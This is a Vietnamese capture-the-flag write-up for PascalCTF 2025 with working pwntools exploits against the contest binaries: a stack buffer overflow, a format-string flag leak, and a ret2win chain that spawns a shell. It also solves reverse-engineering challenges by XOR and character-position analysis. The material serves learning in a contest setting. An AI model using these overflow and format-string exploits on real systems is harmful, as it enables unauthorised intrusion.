---
title: '[Writeup] PascalCTF 2025'
date: 2025-03-20 05:58:12
tags:
  - PWN
  - Writeups

---

Đang giữa tuần, và cũng rất nhiều bài kiểm tra giữa kỳ. Mình thấy hơi xì-chét nên lên check CTFTime thì thấy giải này. Giải này chơi cá nhân và chủ yếu là dành cho Newbie nên mình gần như clear đề (Còn mỗi câu Crypto cuối chưa làm kịp @@). Writeup này cũng như là để ghi nhớ giải CTF đầu tiên mà bản thân gần như clear trong năm.

Mình sẽ chỉ giải một vài bài thuộc chuyên môn của mình (PWN, Web, RE - nhưng Web dễ quá nên mình lười viết hehehe) với giải thích đơn giản.

![alt text](/img/2025/pascalCTF2025/image0.png)

![alt text](/img/2025/pascalCTF2025/image00.png)

# PWN

Những bài PWN đều khá dễ không có source code nên mình sẽ dùng IDA để phân tích.

## Morris Worm

![alt text](/img/2025/pascalCTF2025/image.png)

### Analysis

**Checksec**

```bash
┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/pascalctf/Morris Worm]
└─$ checksec worm 
[*] '/mnt/d/Security/ctf-storage/2025/pascalctf/Morris Worm/worm'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

**Source code**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[44]; // [rsp+0h] [rbp-30h] BYREF
  int v5; // [rsp+2Ch] [rbp-4h]

  signal(14, handle_alarm);
  alarm(0x1Eu);
  init();
  v5 = 69;
  puts("Do you want to say something?");
  fgets(s, 1337, stdin);
  if ( v5 == 1337 )
  {
    puts("Welcome back Kevin !");
    win();
  }
  else
  {
    puts("Bye");
  }
  return 0;
}
```

Dựa vào những gì lấy được từ checksec và logic của đoạn code thì bài này là một bài **BOF** ở hàm `fgets(s, 1337, stdin);` => Ghi đè giá trị của biến `v5` thành **1337** => Get flag

### Exploit

```python
from pwn import *

# p = process("./worm")
p = remote("morrisworm.challs.pascalctf.it", 1337)

payload = flat(
    b"A" * 44,
    p64(1337)
)

p.sendlineafter(b"?", payload)

p.interactive()
```

![alt text](/img/2025/pascalCTF2025/{91523F4A-A5E9-4E4C-9BBF-C245A838A01F}.png)

## E.L.I.A

![alt text](/img/2025/pascalCTF2025/image-1.png)

### Analysis

**Checksec**

```bash
┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/pascalctf/E.L.I.A]
└─$ checksec elia
[*] '/mnt/d/Security/ctf-storage/2025/pascalctf/E.L.I.A/elia'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

**Source code**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+8h] [rbp-68h]
  char s[48]; // [rsp+10h] [rbp-60h] BYREF
  char format[40]; // [rsp+40h] [rbp-30h] BYREF
  unsigned __int64 v7; // [rsp+68h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  signal(14, handle_alarm);
  alarm(0x1Eu);
  init();
  stream = fopen("flag.txt", "r");
  if ( stream )
  {
    if ( fgets(s, 38, stream) )
    {
      fclose(stream);
      s[38] = 0;
      puts("Wow, it actually compiled! Do you want to write something?");
      fgets(format, 30, stdin);
      printf(format);
      return 0;
    }
    else
    {
      puts("Error: Flag file is empty");
      return 1;
    }
  }
  else
  {
    puts("Error: File not found");
    return 1;
  }
}int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+8h] [rbp-68h]
  char s[48]; // [rsp+10h] [rbp-60h] BYREF
  char format[40]; // [rsp+40h] [rbp-30h] BYREF
  unsigned __int64 v7; // [rsp+68h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  signal(14, handle_alarm);
  alarm(0x1Eu);
  init();
  stream = fopen("flag.txt", "r");
  if ( stream )
  {
    if ( fgets(s, 38, stream) )
    {
      fclose(stream);
      s[38] = 0;
      puts("Wow, it actually compiled! Do you want to write something?");
      fgets(format, 30, stdin);
      printf(format);
      return 0;
    }
    else
    {
      puts("Error: Flag file is empty");
      return 1;
    }
  }
  else
  {
    puts("Error: File not found");
    return 1;
  }
}
```

Bài này là một bài **Format String** ở đoạn code `printf(format);`

Mình dùng đoạn code bên dưới để lấy flag

```python
from pwn import *


for i in range(20):
    p = remote(b"elia.challs.pascalctf.it", 1339, level="error")
    
    p.sendlineafter(b"?", f"%{i}$p".encode())
    p.recvline()
    info(f"[{i}] {p.recvline()}")
    p.close()
```

> Ở offset thứ 8 là của flag

![alt text](/img/2025/pascalCTF2025/{161694E0-C354-4B99-A302-686262E3B202}.png)

```python
import struct

hex_values = [
    0x54436c6163736170,
    0x3172705f306e7b46,
    0x6e6c75762d66746e,
    0x7d6c6c3440
]

flag = b''.join(struct.pack('<Q', x) for x in hex_values)
print(flag.decode('utf-8', errors='ignore'))
```

![alt text](/img/2025/pascalCTF2025/{2A27E825-BD6D-40E5-B00C-19379FC7FE3C}.png)

## Unpwnable shop

![alt text](/img/2025/pascalCTF2025/image-2.png)

### Analysis

**Checksec**

```bash
┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/pascalctf/Unpwnable shop]
└─$ checksec unpwnable 
[*] '/mnt/d/Security/ctf-storage/2025/pascalctf/Unpwnable shop/unpwnable'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

**Source code**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  int v7; // edx
  int v8; // ecx
  int v9; // r8d
  int v10; // r9d
  int v12; // [rsp+Ch] [rbp-54h] BYREF
  _BYTE v13[76]; // [rsp+10h] [rbp-50h] BYREF
  unsigned int v14; // [rsp+5Ch] [rbp-4h]

  ssignal(14LL, handle_alarm, envp);
  alarm(30LL);
  init();
  v14 = 81;
  puts("Welcome to Unpwnable shop!\n***Now with support for abnormally long usernames!!1!***");
  puts("To continue insert your name (don't even think about overwriting some return addresses, you can't lmao) :");
  fgets(v13, 81LL, stdin);
  printf((unsigned int)"Welcome to the shop %s\n\n\n", (unsigned int)v13, v3, v4, v5, v6);
  printMenu();
  _isoc99_scanf((unsigned int)"%d", (unsigned int)&v12, v7, v8, v9, v10);
  getchar();
  if ( v12 )
  {
    puts("finding stuff to sell...");
    sleep(1LL);
    if ( v12 == 69 )
    {
      puts("What was your name again? I forgot it.");
      fgets(v13, v14, stdin);
      puts("Ok, just hold on while i finish searching.");
      sleep(2LL);
    }
    puts("didn't find anything :(");
  }
  puts("Bye!");
  return 0;
}
```

```c
__int64 printMenu()
{
  puts(&unk_49B050);
  puts(&unk_49B148);
  puts(&unk_49B258);
  puts(&unk_49B380);
  puts(&unk_49B4A8);
  puts(&unk_49B5E0);
  puts(&unk_49B6F0);
  puts(&unk_49B7D8);
  puts(&unk_49B898);
  puts(&unk_49B938);
  puts(&unk_49B9B2);
  puts("Market menu:");
  puts("[0] Exit");
  return puts("[1] Buy amazing stuff");
}
```

```c
__int64 win()
{
  return execve("/bin/sh", 0LL, 0LL);
}
```

Trong bài này, mình thấy có hàm `win` không được gọi, cũng như **PIE tắt** => ret2win để gọi hàm win và lấy flag

> **Canary Found** từ **checksec** là lỗi của thằng **checksec** nha quý zị :> Lâu lâu nó ngu vậy á, nên bài này không có canary.

Dựa vào logic của code thì mình nhận thấy `fgets(v13, 81LL, stdin);` cho nhập vào biến `v13` tận 81 ký tự (Nhiều hơn khai báo 5 ký tự). Tuy nhiên với mỗi 5 byte này thì không thể ghi đè địa chỉ trả về được => Thay vào đó mình sẽ tận dụng lỗi BOF để ghi đè giá trị của biến `v14` nằm liền kề. => Tiếp theo là nhập **69** để chương trình đi vào phần nhập lần 2 của biến `v13` (Lúc này do **v14** đã bị ghi đè nên attacker có thể kiểm soát được số lượng ký tự nhập vào `v13`) -> BOF lần 2
Lúc này đã có đủ số byte thừa ra cần thiết để thực hiện kỹ thuật **ret2win** nên mình sẽ viết payload luôn.

### Exploit

```python
from pwn import *

# p = process("./unpwnable")
p=remote("unpwnable.challs.pascalctf.it", 1338)
elf = ELF("./unpwnable", checksec=False)


payload = b"A" * 80
p.sendlineafter(b"lmao) :\n", payload)

p.sendlineafter(b"stuff", b"69")

payload = flat(
    b"A" * 88,
    p64(elf.sym.win)
)

p.sendlineafter(b"it.", payload)
p.interactive()
```

![alt text](/img/2025/pascalCTF2025/{EB3BF106-F1BE-4B27-BEAA-7C9B5C1B23D7}.png)

# Reverse Engineer

## X-Ray

![alt text](/img/2025/pascalCTF2025/X-Ray.png)

### Analysis

- **Source code**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-44h]
  char s[56]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v6; // [rsp+48h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  fwrite("Insert the secret code: ", 1uLL, 0x18uLL, _bss_start);
  fgets(s, 50, stdin);
  v4 = strlen(s);
  if ( v4 > 0 && s[v4 - 1] == 10 )
    s[v4 - 1] = 0;
  if ( (unsigned __int8)checkSignature(s) )
    printf("Congrats! You have found the secret code, pascalCTF{%s}", s);
  else
    fwrite("Sorry, the secret code is wrong!", 1uLL, 0x20uLL, _bss_start);
  return 0;
}

__int64 __fastcall checkSignature(const char *a1)
{
  int i; // [rsp+1Ch] [rbp-4h]

  if ( strlen(a1) != 18 )
    return 0LL;
  for ( i = 0; (unsigned __int64)i <= 0x11; ++i )
  {
    if ( ((unsigned __int8)key[i] ^ a1[i]) != encrypted[i] )
      return 0LL;
  }
  return 1LL;
}
```

- **Data**

```asm
.rodata:0000000000002010 key             db '*7^tVr4FZ#7S4RFNd2',0
.rodata:0000000000002010                                         ; DATA XREF: checkSignature+43↑o
.rodata:0000000000002023                 align 10h
.rodata:0000000000002030                 public encrypted
.rodata:0000000000002030 ; _BYTE encrypted[19]
.rodata:0000000000002030 encrypted       db 78h, 52h, 8, 47h, 24h, 47h, 7, 19h, 6Bh, 50h, 68h, 67h
.rodata:0000000000002030                                         ; DATA XREF: checkSignature+55↑o
.rodata:000000000000203C                 db 43h, 61h, 35h, 7Eh, 9, 1, 0
```

Bài này đơn giản là chương trình sẽ lấy chuỗi người dùng nhập vào đem xor với **key** rồi so sánh với **enc** => Xor ngược lại để lấy được flag

### Exploit

```python
key = "*7^tVr4FZ#7S4RFNd2"
enc = [0x78, 0x52, 8, 0x47, 0x24, 0x47, 7, 0x19, 0x6B, 0x50, 0x68, 0x67, 0x43, 0x61, 0x35, 0x7E, 9, 1]

for i in range(len(key)):
    print(chr(ord(key[i]) ^ enc[i]), end="")
```

```bash
┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/ctf-storage/2025/pascalctf/RE/x-ray]
└─$ python3 sol.py 
ReV3r53_1s_4w3s0m3
```

## Switcharoo

![alt text](/img/2025/pascalCTF2025/Switcharoo)

### Analysis

- **Source code**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  __int64 v4; // rdx
  int result; // eax
  int i; // [rsp+Ch] [rbp-44h]
  _BYTE v7[40]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v8; // [rsp+38h] [rbp-18h]

  v8 = __readfsqword(0x28u);
  v3 = std::operator<<<std::char_traits<char>>(&_bss_start, "Welcome to switcharoo! Can you guess my flag?", envp);
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  std::string::basic_string(v7);
  std::operator>><char>(&std::cin, v7);
  if ( std::string::size(v7) != 32 )
    lose();
  for ( i = 0; i < (unsigned __int64)std::string::size(v7); ++i )
  {
    switch ( *(_BYTE *)std::string::operator[](v7, i) )
    {
      case '0':
        if ( i != 12 && i != 29 && i != 22 )
          lose();
        return result;
      case '3':
        if ( i != 25 )
          lose();
        return result;
      case '4':
        if ( i != 17 )
          lose();
        return result;
      case 'C':
        if ( i != 6 )
          lose();
        return result;
      case 'D':
        if ( i != 21 )
          lose();
        return result;
      case 'F':
        if ( i != 8 )
          lose();
        return result;
      case 'L':
        if ( i != 13 && i != 30 )
          lose();
        return result;
      case 'T':
        if ( i != 7 && i != 19 )
          lose();
        return result;
      case 'V':
        if ( i != 26 )
          lose();
        return result;
      case '_':
        if ( i != 15 && i != 20 && i != 23 && i != 27 )
          lose();
        return result;
      case 'a':
        if ( i != 1 && i != 4 && i != 11 )
          lose();
        return result;
      case 'c':
        if ( i != 3 && i != 16 )
          lose();
        return result;
      case 'l':
        if ( i != 5 && i != 28 )
          lose();
        return result;
      case 'n':
        if ( i != 18 )
          lose();
        return result;
      case 'o':
        if ( i != 14 )
          lose();
        return result;
      case 'p':
        if ( i && i != 10 )
          lose();
        return result;
      case 'r':
        if ( i != 24 )
          lose();
        return result;
      case 's':
        if ( i != 2 )
          lose();
        return result;
      case '{':
        if ( i != 9 )
          lose();
        return result;
      case '}':
        if ( i != 31 )
          lose();
        return result;
      default:
        lose();
    }
  }
  std::operator<<<std::char_traits<char>>(&_bss_start, "Good job, now submit that flag!", v4);
  std::string::~string(v7);
  return 0;
}
```

Logic bài này đơn giản là chúng ta sẽ nối lại các ký tự theo thứ tự từ 0 -> 31 để lấy được flag hoàn chỉnh

> Flag: pascalCTF{pa0Lo_c4nT_D0_r3V_l0L}

## KONtAct MI

![alt text](/img/2025/pascalCTF2025/KONtAct-MI.png)

Bài này mình thấy khá khó hiểu với cách ra đề của tác giả. Không biết là cố tình để nó dễ hay là vô tình làm nó hong khó :>

### Analysis

Bài này được cấp source code đầy đủ + file binary

- **main.c**

```c
/**
 * @file main.c
 * @author Marco Balducci, Alan Davide Bovo
 * @date 2024-08-09
 * Compile with: gcc main.c util.c -lcurl -o kontactmi
 */
#include "util.h"

struct player{
    char name[20];
    int score;
};

void play_game(){
    while(1){
        print_map();
        char choice = getchar();
        getchar();
        if(choice == 'w')
            update_position(0, -1);
        else if(choice == 's')
            update_position(0, 1);
        else if(choice == 'a')
            update_position(-1, 0);
        else if(choice == 'd')
            update_position(1, 0);
        else if(choice == 'q')
            break;

        clear_screen();
    }
    return;
}

int main(){
    setupbuf();
    setup_collectables();

    while(1){
        char choice = menu();
        if(choice == '1')
            play_game();
        else if(choice == '2')
            contact_support();
        else if(choice == '3')
            break;
    }
    return 0;
}
```

- **util.c**

```c
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>

#include "util.h"

void setupbuf(void){
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void clear_screen(void){
    printf("\033[H\033[J");
}

struct Pair{
    int x;
    int y;
};

struct Pair player_position = {5, 2};

struct Collectable{
    struct Pair position;
    char name[5];
};

struct Collectable collectables[10] = {
    {{5, 6}, "up"},
    {{18, 2}, "up"},
    {{48, 6}, "down"},
    {{27, 2}, "down"},
    {{50, 2}, "left"},
    {{24, 10}, "right"},
    {{15, 14}, "left"},
    {{9, 2}, "right"},
    {{35, 14}, "B"},
    {{56, 14}, "A"},
};

char menu(void){
    char choice;
    printf("1. Play\n");
    printf("2. Contact support\n");
    printf("3. Exit\n");
    printf("Enter your choice: ");
    scanf("%c", &choice);
    clearStdin();
    return choice;
}

void clearStdin(void){
    int c;
    while((c = getchar()) != '\n' && c != EOF);
}

char progress[50] = {'\0'};

char strings[][200] = {
    "╔════════════════════════════════════════════════════════╗\n",
    "║ ###################################################### ║\n",
    "║ #o    #  #  #  #        #        #     #     #     # # ║\n",
    "║ ###   #  #  #  #  #######  #  ####  ####  #######  # # ║\n",
    "║ #     #  #     #           #  #           #     #    # ║\n",
    "║ ####  #  #  ####  ##########  #######  #######  #  ### ║\n",
    "║ #  #              #        #        #        #     # # ║\n",
    "║ #  ####  ####  #  ####  #######  ####  ##########  # # ║\n",
    "║ #  #        #  #           #  #           #          # ║\n",
    "║ #  #  ##########  ##########  #  #######  ####  #### # ║\n",
    "║ #              #  #  #  #  #        #              # # ║\n",
    "║ #  ####  #  #######  #  #  #  #  #############  ###### ║\n",
    "║ #  #     #     #  #     #     #        #     #       # ║\n",
    "║ ####  #######  #  #  ####  ##########  #  #######  ### ║\n",
    "║ #           #  #              #              #       # ║\n",
    "║ ###################################################### ║\n",
    "╠════════════════════════════════════════════════════════╣\n",
    "║                                                        ║\n",
    "║         ╔═════╗                             o  o       ║\n",
    "║         ║     ║                          o        o    ║\n",
    "║         ║     ║                         o          o   ║\n",
    "║   ╔═════╝     ╚═════╗                   o          o   ║\n",
    "║   ║                 ║                    o        o    ║\n",
    "║   ║                 ║           o  o        o  o       ║\n",
    "║   ╚═════╗     ╔═════╝        o        o                ║\n",
    "║         ║     ║             o          o               ║\n",
    "║         ║     ║             o          o               ║\n",
    "║         ╚═════╝              o        o                ║\n",
    "║                                 o  o                   ║\n",
    "║                                                        ║\n",
    "║                                                        ║\n",
    "║                     □□□□          □□□□                 ║\n",
    "║                  □□□□          □□□□                    ║\n",
    "║               □□□□          □□□□                       ║\n",
    "║            □□□□          □□□□                          ║\n",
    "║                                                        ║\n",
    "╚════════════════════════════════════════════════════════╝\n\n"};

void setup_collectables(){
    for (int i = 0; i < 10; i++){
        strings[collectables[i].position.y][collectables[i].position.x] = 'x';
    }
}

void print_map(){
    struct Pair player_position = get_position();

    for (int i = 0; i < 37; i++){
        printf("%s", strings[i]);
    }
    printf("Progress: %s\n", progress);
    return;
}

struct Pair get_position(){
    struct Pair position = {
        player_position.x,
        player_position.y
    };
    return position;
}

void get_collectable(struct Pair position){
    for (int i = 0; i < 10; i++){
        if (collectables[i].position.x == position.x && collectables[i].position.y == position.y){
            strings[position.y][position.x] = ' ';
            for (int j = 0; j < 46; j++){
                if (progress[j] == '\0'){
                    char *name = collectables[i].name;
                    if(j > 0){
                        progress[j] = '-';
                        j++;
                    }
                    for (int k = 0; k < strlen(name); k++){
                        progress[j + k] = name[k];
                    }
                    return;
                }
            }
        }
    }
    return;
}

bool check_movement(int x_movement, int y_movement){
    struct Pair current_position = get_position();
    return strings[current_position.y + y_movement][current_position.x + x_movement] != '#';
}

void update_position(int x_movement, int y_movement){
    if (check_movement(x_movement, y_movement)){
        strings[player_position.y][player_position.x] = ' ';
        player_position.x += x_movement;
        player_position.y += y_movement;
        if (strings[player_position.y][player_position.x] == 'x'){
            get_collectable(player_position);
        }
        strings[player_position.y][player_position.x] = 'o';
    }
    return;
}

void contact_support(void){
    puts("***** Contact support *****\n\n");
    printf("Would you like to send your progress to support? (Y/n): ");
    char choice = getchar();
    clearStdin();
    if (choice != 'n' && choice != 'N'){
        puts("\nSending progress to support...");
        CURL *curl;
        CURLcode res;
        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();

        if (curl){
            // TODO: add GET requests to api @ /adminSupport
            // curl_easy_setopt(curl, CURLOPT_URL, URL);
            // curl_easy_perform(curl);

            curl_easy_setopt(curl, CURLOPT_URL, "https://kontactmi.challs.pascalctf.it/adminSupport"); // TODO: Change to actual support URL
            char json_data[256];
            snprintf(json_data, 256, "{\"code\":\"%s\"}", progress);

            struct curl_slist *headers = NULL;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data);

            sleep(2);
            res = curl_easy_perform(curl);
            
            if (res != CURLE_OK)
                puts("Failed to send progress to support, please contact admins for help");
            
            puts("\n");
            
            curl_easy_cleanup(curl);
            curl_slist_free_all(headers);
            curl_global_cleanup();
        }
        else
            printf("%s", "Something really bad happened");
    }

    return;
}
```

- **util.h**

```c
#ifndef UTIL_H
#define UTIL_H

#include <stdio.h>

void print_map();
void clearStdin(void);
void update_position(int x_movement, int y_movement);
struct Pair get_position();
void clear_screen(void);
void setupbuf(void);
void setup_collectables();
char menu(void);
void contact_support(void);

#endif
```

Mình xem nhanh qua code thì hiểu được là chương trình sẽ cho mình chơi một trò chơi điều khiển di chuyển một đối tượng với các thao tác: **up, down, right, left, A và B**.

Sau đó, khi chọn `contact_support` thì sẽ gửi request lên server **https://kontactmi.challs.pascalctf.it/adminSupport** với danh sách các nút bấm mà người chơi đã nhấn.

Mình tò mò nên vào url đấy xem thử thì khi GET nó trả về một chuỗi như là danh sách các nút bấm. (Chuỗi này cũng xuất hiện trong code)

![alt text](/img/2025/pascalCTF2025/url.png)

Mình thử POST chuỗi này lên luôn thì ... Bùm, nhận được flag luôn :>

![alt text](/img/2025/pascalCTF2025/meme.png)

![alt text](/img/2025/pascalCTF2025/{E4F24659-E6A0-4BFD-9DA2-D0640446A26F}.png)
